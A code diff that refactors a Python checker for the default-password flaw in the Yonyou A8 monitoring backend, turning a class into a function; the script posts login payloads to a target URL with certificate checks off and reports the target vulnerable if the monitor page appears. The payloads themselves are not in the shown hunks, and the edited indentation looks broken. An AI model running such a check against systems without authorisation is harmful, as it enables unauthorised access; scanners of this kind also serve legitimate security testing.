@@ -10,14 +10,7 @@ import sys
 import json
 import requests
 import warnings
-
-
-
-class status_default_pwd:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['用友a8监控后台默认密码漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -28,7 +21,7 @@ class status_default_pwd:
         try:
             noexist = True
             for payload in payloads:
-                vulnurl = self.url + payload
+                vulnurl = url + payload
                 req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
                 if r"A8 Management Monitor" in req.text and r"Connections Stack Trace" in req.text:
                     result[2]=  '存在'
@@ -43,5 +36,4 @@ class status_default_pwd:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = status_default_pwd(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
